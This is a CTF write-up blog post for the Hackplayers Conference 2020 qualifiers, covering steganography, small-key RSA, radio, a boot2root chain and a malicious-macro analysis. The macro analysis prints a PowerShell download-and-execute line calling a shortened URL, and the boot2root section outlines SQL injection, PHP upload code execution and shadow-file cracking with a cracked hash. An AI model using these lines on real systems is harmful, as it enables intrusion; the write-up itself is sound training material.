<!DOCTYPE html><html lang="en"><head>
    
      <title>
        Hackplayers Conference 2020 Qualifiers CTF Writeup ::
        jorgectf — blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="description" content="Hackplayers Conference Qualifiers CTF Writeup."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://jorgectf.github.io/blog/post/h-con-writeup/"/>





<link rel="stylesheet" href="https://jorgectf.github.io/blog/assets/style.css"/>

<link rel="stylesheet" href="https://jorgectf.github.io/blog/style.css"/>


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.github.io/blog/img/apple-touch-icon-144-precomposed.png"/>
<link rel="shortcut icon" href="https://jorgectf.github.io/blog/img/favicon.png"/>


<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hackplayers Conference 2020 Qualifiers CTF Writeup"/>
<meta name="twitter:description" content="Hackplayers Conference Qualifiers CTF Writeup."/>



<meta property="og:title" content="Hackplayers Conference 2020 Qualifiers CTF Writeup"/>
<meta property="og:description" content="Hackplayers Conference Qualifiers CTF Writeup."/>
<meta property="og:type" content="article"/>
<meta property="og:url" content="https://jorgectf.github.io/blog/post/h-con-writeup/"/><meta property="article:section" content="post"/>
<meta property="article:published_time" content="2019-11-19T13:55:00+00:00"/>
<meta property="article:modified_time" content="2019-11-19T13:55:00+00:00"/><meta property="og:site_name" content="jorgectf"/>







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="https://jorgectf.github.io/blog/" class="logo" style="text-decoration: none;">
  
  <img src="https://jorgectf.github.io/blog/logo.png" alt="jorgectf"/>
  
</a>
    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
    
    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
    
    
    
    <li><a href="https://jorgectf.github.io/blog/research/">Research</a></li>
    
    
    <li><a href="../">About</a></li>
    
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
    
    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
    
    
    
    <li><a href="https://jorgectf.github.io/blog/research/">Research</a></li>
    
    
    <li><a href="https://jorgectf.github.io/blog/../">About</a></li>
  </ul>
</nav>
        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"></path>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Hackplayers Conference 2020 Qualifiers CTF Writeup</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2019-11-19
        </span>

        
          
        
      

      


      
    </div>

    
      <span class="post-tags">
        
          <a href="https://jorgectf.github.io/blog/tags/h-con/">#h-con</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/ctf/">#ctf</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/stego/">#stego</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/crypto/">#crypto</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/radio/">#radio</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/forensics/">#forensics</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/boot2root/">#boot2root</a> 
        
      </span>
    

    

    <div class="post-content">
      
      <p>In this post I will be covering <a href="https://www.h-c0n.com/p/home.html" target="_blank">hcon</a>’s ctf challenges. This has been the first con I was looking forward to attending and getting classified for the final has been a great experience, let’s see how it goes :D</p>
<p>The challenges were divided into: Reversing, Binary Exploiting, Steganography, Cryptography, Radio, Boot2root and Forensics. I will be covering all of them except Reversing and Exploiting. Let’s begin!</p>
<h1 id="steganography">Steganography</h1>
<p>Challenge information:</p>
<ul>
<li>Name: Samurai</li>
<li>Points: 200</li>
<li>Description: “The general who is skilled in defense hides in the most secret recesses of the earth” Sun Tzu’s Art of War</li>
<li>File: <a href="https://jorgectf.github.io/blog/static/hcon2020/samurai.png">samurai.png</a></li>
</ul>
<p><img src="https://jorgectf.github.io/blog/static/hcon2020/samurai.png" alt=""/></p>
<p>At first we get a photo of a “samurai” which seems to be hiding something as it’s weird. While doing regular checks we find out there may be a hidden file.</p>
<p>Exiftool output (We will need it later :P)</p>
<pre tabindex="0"><code>$ exiftool samurai.png 

&lt;--- data ---&gt;
Author                          : dhsdshdhk
&lt;--- data ---&gt;
</code></pre><pre tabindex="0"><code>$ strings samurai.png

&lt;--- more data ---&gt;
vQ&gt;Y
Py.=
k-&gt;l
[`as
=o3f
o7PK
wind.wav
</code></pre><p>Let’s try binwalk and extract it.</p>
<pre tabindex="0"><code>$ binwalk -e samurai.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 480 x 720, 8-bit/color RGB, non-interlaced
41            0x29            Zlib compressed data, best compression
161106        0x27552         Zip archive data, at least v2.0 to extract, compressed size: 278566, uncompressed size: 1322620, name: wind.wav
439800        0x6B5F8         End of Zip archive, footer length: 22
</code></pre><p>We can now get into our wind.wav and analyse it.</p>
<p>Everytime I face an audio file I try to get its <a href="https://en.wikipedia.org/wiki/Spectrogram" target="_blank">Spectrogram</a> with <a href="https://www.sonicvisualiser.org/" target="_blank">Sonic-Visualiser</a> as it’s a very common way of hiding data.</p>
<pre tabindex="0"><code>$ sonic-visualiser wind.wav

Pane &gt; Add Spectrogram
</code></pre><p><img src="https://jorgectf.github.io/blog/static/hcon2020/spectro.png" alt=""/></p>
<p>As we can see, there’s a word “SHINOBI”, what could that mean? Nothing came to mind…</p>
<p>Now it’s the time to get the previous information about the first photo’s metadata and search about that author. We can use tools like <a href="https://namechk.com/" target="_blank">namechk</a> to see whether the username is taken in a social network or not, but google works fine this time.</p>
<p><a href="https://github.com/dhsdshdhk" target="_blank">This</a> is the first result google gives us and is hosting a repo with a <a href="https://github.com/dhsdshdhk/stegpy" target="_blank">steganography tool</a>; we are close to the solution ;)</p>
<pre tabindex="0"><code>$ pip3 install stegpy

$ stegpy wind.wav -p
Enter password (will not be echoed): SHINOBI
Wrong password.

$ stegpy samurai.png -p
Enter password (will not be echoed): SHINOBI
H-c0n{3899dcbab79f92af727c2190bbd8abc5}
</code></pre><p>There we go! We got the flag :P</p>
<h1 id="cryptography">Cryptography</h1>
<p>Challenge information:</p>
<ul>
<li>Name: Kojo No Mai</li>
<li>Points: 200</li>
<li>Description: Prunus Incisa “Kojo No Mai” is the Japanese name for a dwarf or bonsai cherry. Although small things can be precious it is not a good idea to use them in cryptography … cause usually with a small key it is easier to break the encryption, right?</li>
<li>File: <a href="https://jorgectf.github.io/blog/static/hcon2020/kojonomai.txt">kojonomai.txt</a></li>
</ul>
<pre tabindex="0"><code>$ cat kojonomai.txt 
-----BEGIN PUBLIC KEY-----
MCwwDQYJKoZIhvcNAQEBBQADGwAwGAIRAOSpZLB7VXE7iZA72YTS85UCAwEAAQ==
-----END PUBLIC KEY-----

XnZvSmNqZqz+N5LL+ec6XA==
k4TD9AHouSlxdn97PXfmOg==
FhHp7W1orCt78mlz5PNGBQ==
a5FPpzeDX29qOriH2kS64A==
XCWOYhWFC6v3wa3qM58v5g==
qlLYhsaMWbOvCXddqsQ/pA==
i1jClSfyTf8XLiT57Su6IQ==
DZbTy4vMKW0WqjrD7CspMg==
</code></pre><p>This is clearly a RSA key and as the description says, it’s surely going to be breakable. Let’s try with <a href="https://github.com/Ganapati/RsaCtfTool" target="_blank">RsaCtfTool</a> and get the private key to decrypt the messages.</p>
<pre tabindex="0"><code>$ RsaCtfTool.py --publickey public.key --private
-----BEGIN RSA PRIVATE KEY-----
MGQCAQACEQDkqWSwe1VxO4mQO9mE0vOVAgMBAAECEQDdv/jJvZHK0CDDfXs8vASB
AgkA6nTNPNoXOLkCCQD5rEi0wt8rvQIJANrmxP0MzuOZAgkAy4+dA8vyWt0CCA7U
J3WkWZCx
-----END RSA PRIVATE KEY-----
</code></pre><p>Now those messages can be recovered.</p>
<pre tabindex="0"><code>XnZvSmNqZqz+N5LL+ec6XA== = ??????e�H-c0n
k4TD9AHouSlxdn97PXfmOg== = ?kX?6&lt;%l�{1aa3
FhHp7W1orCt78mlz5PNGBQ== = ?J????�6c2eb
a5FPpzeDX29qOriH2kS64A== = ?rMH+?�49a2f
XCWOYhWFC6v3wa3qM58v5g== = A.?jj??�427e5
qlLYhsaMWbOvCXddqsQ/pA== = NK????�7c715
i1jClSfyTf8XLiT57Su6IQ== = ?vH?iT?)�bda83
DZbTy4vMKW0WqjrD7CspMg== = }p?Z???�9e6}
</code></pre><p>Flag:</p>
<pre tabindex="0"><code>H-c0n{1aa36c2eb49a2f427e57c715bda839e6}
</code></pre><h1 id="boot2root">Boot2root</h1>
<p>I’m afraid I won’t be able to cover the entire process, as the mirrors are turned off.</p>
<p>User flag « SQL injection in an outdated CMD Made Simple’s version leading to credential obtainance « Misconfiguration allowing an authorized user to upload files and change its extension to .php (Code execution) « Privilege escalation to “prequals” user by a read permission for everyone in its encrypted ssh keys, crackable with <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank">JohnTheRipper</a>.</p>
<p>Root flag « Obtainance of a /etc/shadow’s copy in /var/backups crackable with <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank">JohnTheRipper</a> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" target="_blank">this</a> dictionary « $6$dzULlI9m$PFRv56FDSBt3lwtzzS6Pwk1Zje9.BpW7LZfWK30Wviak5d9oChjUYOJpeOr9ZnrqU5bonapYkCpc55fjG.nop1:lp0520 « su root with ‘lp0520’.</p>
<h1 id="forensics">Forensics</h1>
<p>Challenge information:</p>
<ul>
<li>Name: Baby malicious</li>
<li>Points: 200</li>
<li>Description: You are in a forensic department, there is an aggressive malware campaign and your colleagues in the Incident Management department have sent you the following obfuscated macro to analyze.</li>
<li>File: <a href="https://jorgectf.github.io/blog/static/hcon2020/babymaldoc.vba">babymaldoc.vba</a></li>
</ul>
<p>We face a malicious visual basic code, that use to be in office macros. I like using <a href="https://github.com/decalage2/ViperMonkey" target="_blank">Vmonkey</a> for this kind of challenges.</p>
<pre tabindex="0"><code>$ vmonkey -c babymaldoc.vba

&lt;--- data ---&gt;
Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | autoopen                  |                           |
| CreateObject      | [&#39;WScript.Shell&#39;]         | Interesting Function Call |
| Run               | [&#34;powershell.exe -NoLogo  | Interesting Function Call |
|                   | iex ((New-Object Net.WebC |                           |
|                   | lient).D0wnloadString(&#39;ht |                           |
|                   | tps://bit.ly/2NgCC0O&#39;))&#34;, |                           |
|                   | 0]                        |                           |
| Run               | ly/2NgCC0O&#39;))             | Interesting Function Call |
| Debug Print       | BPStegano with SALCHICHON |                           |
+-------------------+---------------------------+---------------------------+

&lt;--- data ---&gt;
</code></pre><p>As we can see, the script calls a powershell process to download a shortened link hosting a photo. After downloading it, we can also see there’s a hint telling us that some data is hidden inside the photo using <a href="https://github.com/TapanSoni/BPStegano" target="_blank">BPStegano</a>. After installing it and executing…</p>
<pre tabindex="0"><code>D:\Descargas\BPStegano-master\BPStegano-master&gt;python stegano.py
 _______  _______ _______ __
|   _   \|   _   |   _   |  |_.-----.-----.---.-.-----.-----.
|.  1   /|.  1   |   1___|   _|  -__|  _  |  _  |     |  _  |
|.  _   \|.  ____|____   |____|_____|___  |___._|__|__|_____|
|:  1    |:  |   |:  1   |          |_____|
|::.. .  |::.|   |::.. . |
`-------&#39;`---&#39;   `-------&#39;


Select a specific functionality from the menu below

1) Hide a secret message into an image
2) Find a secret message from an image
3) Exit BPS Stegano

Menu option selection -&gt; 2

Enter the SECRET KEY that was used to encrypt the secret message -&gt; SALCHICHON
Provide the PATH of the source image -&gt; whereisyourgod.png

Decoding...

  [=================================100.0%=================================]

#####################################################################
HIDDEN MESSAGE: H-c0n{5619b327cc5ecce85a7fc99a14a6c5c5}
#####################################################################
</code></pre><h1 id="radio">Radio</h1>
<p>Challenge information:</p>
<ul>
<li>Name: Ok, I got this</li>
<li>Points: 200</li>
<li>Description: We have seen a boy with an antenna next to the garage door. In one of his hands it seemed to have a yardstick one. Can you help us find out what the boy was trying to send?</li>
<li>File: <a href="https://jorgectf.github.io/blog/static/hcon2020/captured.wav">captured.wav</a></li>
<li>Author: <a href="https://twitter.com/_mgp25" target="_blank">mgp25</a></li>
</ul>
<p>This is the first radio challenge I’ve done so far, so I spent several hours researching about radio challenges, tools, etc, and ended up in <a href="https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/" target="_blank">this article</a>. The article explains the method to extract data from this audio file, but now we are using the tool mentioned in the article “ooktools” to extract that data.</p>
<pre tabindex="0"><code>$ ooktools wave binary -S captured.wav 
         _   _           _
 ___ ___| |_| |_ ___ ___| |___
| . | . | &#39;_|  _| . | . | |_ -|
|___|___|_,_|_| |___|___|_|___| v1.3
On-off keying tools for your SD-arrrR
https://github.com/leonjza/ooktools

Total Samples: 607458, Min: -258, Max: 32766, Mean: 16254.0
Cleaning up 607458 data points...
Samples in (Shortest Peak: 370) (Longest Peak: 1109)
Math for baud rate will be 1.0/(370/float(2000000))
Source wave file has baud rate of: 5405
[ ] indicates number of breaks.
Key Data: 01010100011010000110010100100000011001100110110001100001011001110010000001101001011100110010000001001000001011010110001100110000011011100111101100110010001100110011001000110110011000110110011000110011001101100110001000111000001101000011011100110011011001000011011000110001001100010110010000110100001101000011100101100110001100010011000100110111011001000011000000111001001100110011100100111001011001100111110
</code></pre><p>This binary can be converted to text and this is the result:</p>
<pre tabindex="0"><code>The flag is H-c0n{2326cf36b8473d611d449f117d09399f}
</code></pre><p>Challenge information:</p>
<ul>
<li>Name: Modulated Secret</li>
<li>Points: 425</li>
<li>Description: A radio amateur has approached us, very worried, saying that he has been able to capture a broadcast in which a secret was being shared. He had to leave because he had a jumping competition, so he sent us the capture of the broadcast. Can you help us recover the secret?
DOWNLOAD: <a href="https://drive.google.com/open?id=1evWfrTqZ4U1rY47dLcwz9kRnhybq1o6A" target="_blank">https://drive.google.com/open?id=1evWfrTqZ4U1rY47dLcwz9kRnhybq1o6A</a> NOTE: This challenge has a case insensitive flag.</li>
<li>File: <a href="https://jorgectf.github.io/blog/static/hcon2020/damn">damn</a></li>
<li>Author: <a href="https://twitter.com/_mgp25" target="_blank">mgp25</a></li>
</ul>
<p>At first, the file seems to be a binary with no information, but if we listen to it a strange sound is heard. After doing the research for the previous challenge I ended up having some tools related to radio and sound analisis, so finally <a href="http://gqrx.dk/" target="_blank">gqrx</a> worked.</p>
<p>Before getting deaf I managed to get the characters the man was saying in the audio and submit the flag. (The audio: “The flag is (flag preffix + md5 + suffix))</p>
<h1 id="----------------------------------------------------">—————————————————-</h1>
<p>I hope you have enjoyed the writeup, feel completely free to pm me via twitter <a href="https://twitter.com/jorge_ctf" target="_blank">@jorge_ctf</a>, telegram @jorgectf or <a href="mailto:jorgectf@protonmail.com">email</a> to discuss about other solutions or errors I could have done.</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr/>
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://jorgectf.github.io/blog/post/h-con-final-writeup/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Hackplayers Conference 2020 Final CTF Writeup</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://jorgectf.github.io/blog/post/lame-writeup-english/">
                  <span class="button__text">[HackTheBox – Lame] (OSCP Like) English Writeup</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

<script src="https://unpkg.com/shiki"></script>

<script>
    if (document.querySelector("code[data-lang*='ql']")) {
        shiki
            .getHighlighter({
                theme: 'github-dark',
                langs: [
                    {
                        id: 'codeql',
                        scopeName: 'source.ql',
                        path: '/languages/codeql.tmLanguage.json',
                        samplePath: 'codeql.sample',
                        aliases: ['ql']
                    }
                ]
            })
            .then(highlighter => {
                for (codeElement of document.querySelectorAll("code[data-lang]")) {
                    try {
                        let prev = codeElement.textContent
                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
                        codeElement.parentNode.innerHTML = code
                    } catch(err) {
                        console.log(err)
                    }
                }
                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
                    shikiElement.parentNode.parentNode.replaceChild(
                        shikiElement, shikiElement.parentNode
                    )
                }
            })
    }
</script>
      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="https://jorgectf.github.io/blog/" class="logo" style="text-decoration: none;">
  
  <img src="https://jorgectf.github.io/blog/logo.png" alt="jorgectf"/>
  
</a>
      <div class="copyright">
        <span>© 2022 Powered by
          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span>Theme created by
          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
      </div>
    
  </div>
</footer>

<script src="https://jorgectf.github.io/blog/assets/main.js"></script>


      
    </div>

    
  

</body></html>